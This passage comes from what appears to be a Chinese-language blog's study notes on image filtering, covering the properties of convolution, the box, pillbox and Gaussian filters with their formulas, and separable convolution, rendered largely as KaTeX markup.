class="mclose">))</span></span></span></span></p>
<h3 id="Shift-Invariance-平移不变性"><a href="#Shift-Invariance-平移不变性" class="headerlink" title="Shift Invariance (平移不变性)"></a>Shift Invariance (平移不变性)</h3><p>卷积运算的输出仅依赖于滤波器覆盖区域的像素值，而不依赖于滤波器在图像中的具体位置。这意味着如果输入图像平移，输出图像也会以相同的方式平移。</p>
<h3 id="Associativity-结合律"><a href="#Associativity-结合律" class="headerlink" title="Associativity (结合律)"></a>Associativity (结合律)</h3><p>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是两个滤波器，则：</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub><mo>⊗</mo><mo stretchy="false">(</mo><msub><mi>F</mi><mn>1</mn></msub><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>F</mi><mn>2</mn></msub><mo>⊗</mo><msub><mi>F</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F_2 \otimes (F_1 \otimes I(X, Y)) = (F_2 \otimes F_1) \otimes I(X, Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></p>
<h3 id="Symmetry-对称性"><a href="#Symmetry-对称性" class="headerlink" title="Symmetry (对称性)"></a>Symmetry (对称性)</h3><p>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是两个滤波器，则：</p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>F</mi><mn>1</mn></msub><mo>⊗</mo><msub><mi>F</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>F</mi><mn>2</mn></msub><mo>⊗</mo><msub><mi>F</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>⊗</mo><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(F_1 \otimes F_2) \otimes I(X, Y) = (F_2 \otimes F_1) \otimes I(X, Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></p>
<h2 id="常见的线性平滑滤波"><a href="#常见的线性平滑滤波" class="headerlink" title="常见的线性平滑滤波"></a>常见的线性平滑滤波</h2><h3 id="Box-Filter-箱式滤波器"><a href="#Box-Filter-箱式滤波器" class="headerlink" title="Box Filter (箱式滤波器)"></a>Box Filter (箱式滤波器)</h3><p>又被称为平均滤波器 (average filter or mean filter)，简单来说就是把一个方形范围内的像素值做平均就行了。</p>
<p><strong>非旋转对称</strong>，<strong>可分离</strong></p>
<p>然而，箱式滤波器在模拟几何模糊（如焦外模糊）方面表现不佳，因为它将图像中的点扩散为方形区域，而非更自然的圆形或椭圆形。</p>
<p>评价为超级兵</p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_233922.png"></p>
<h3 id="Pillbox-Filter-柱状滤波器"><a href="#Pillbox-Filter-柱状滤波器" class="headerlink" title="Pillbox Filter (柱状滤波器)"></a>Pillbox Filter (柱状滤波器)</h3><p>柱状滤波器类似于箱式滤波器，但它在圆形邻域内进行均值计算，而不是方形邻域，所以比较适合模拟几何模糊</p>
<p><strong>旋转对称</strong>，<strong>不可分离</strong></p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>r</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mn>1</mn><mrow><mi>π</mi><msup><mi>r</mi><mn>2</mn></msup></mrow></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mo>≤</mo><msup><mi>r</mi><mn>2</mn></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>otherwise</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f_r(x, y) = 
\begin{cases} 
\frac{1}{\pi r^2} &amp; \text{if } x^2 + y^2 \leq r^2 \\
0 &amp; \text{otherwise}
\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">π</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">otherwise</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
<p>评价为超级兵</p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_234009.png"></p>
<h3 id="Gaussian-Filter-高斯滤波"><a href="#Gaussian-Filter-高斯滤波" class="headerlink" title="Gaussian Filter (高斯滤波)"></a>Gaussian Filter (高斯滤波)</h3><p>评价为重量级滤波器，没有高斯滤波我都不知道这课要怎么上</p>
<p><strong>旋转对称</strong>，<strong>可分离</strong>，<strong>非常好低通滤波(low pass)</strong></p>
<p>&nbsp;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>σ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>π</mi><msup><mi>σ</mi><mn>2</mn></msup></mrow></mfrac><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><mo>−</mo><mfrac><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup></mrow><mrow><mn>2</mn><msup><mi>σ</mi><mn>2</mn></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G_{\sigma}(x, y) = \frac{1}{2\pi\sigma^2} \exp(-\frac{x^2 + y^2}{2\sigma^2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.415em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">π</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">exp</span><span class="mopen">(</span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.07em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span></p>
<p>其中参数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span> 为控制滤波器的扩散程度的参数。</p>
<ul>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span>越大，平滑程度越高，每个像素的贡献率也会随着距离的增加而逐渐下降。
距离。</li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span> 越小，平滑程度越低，邻近像素的贡献度下降越快。</li>
<li>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span> 非常小，则完全不会产生模糊&#x2F;平滑效果。</li>
</ul>
<p>比如一个3x3的高斯滤波就可以这么计算</p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241019_235104.png"></p>
<p><strong>低通和高通滤波</strong></p>
<p><img data-src="/images/coding/computer-vision-basic-filter/Screenshot_20241020_001506.png"></p>
<h2 id="高效实现卷积"><a href="#高效实现卷积" class="headerlink" title="高效实现卷积"></a>高效实现卷积</h2><p>前面提到了，直接进行卷积&#x2F;Correlation的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>m</mi><mn>2</mn></msup><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m^2n^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>, 对于大规模图像和滤波器，这种方法效率较低。为提高效率，可以采用以下两种方法：</p>
<h3 id="Separability-分离再相乘"><a href="#Separability-分离再相乘" class="headerlink" title="Separability (分离再相乘)"></a>Separability (分离再相乘)</h3><p>对于可分离的高维滤波器，可以把这些滤波器表示为多个一维滤波器的叉积(cross product)。</p>
<p>例如，高斯滤波器是可分离的，可以先对图像的行进行一维高斯滤波，再对列进行一次一维高斯滤波，最后做叉乘</p>
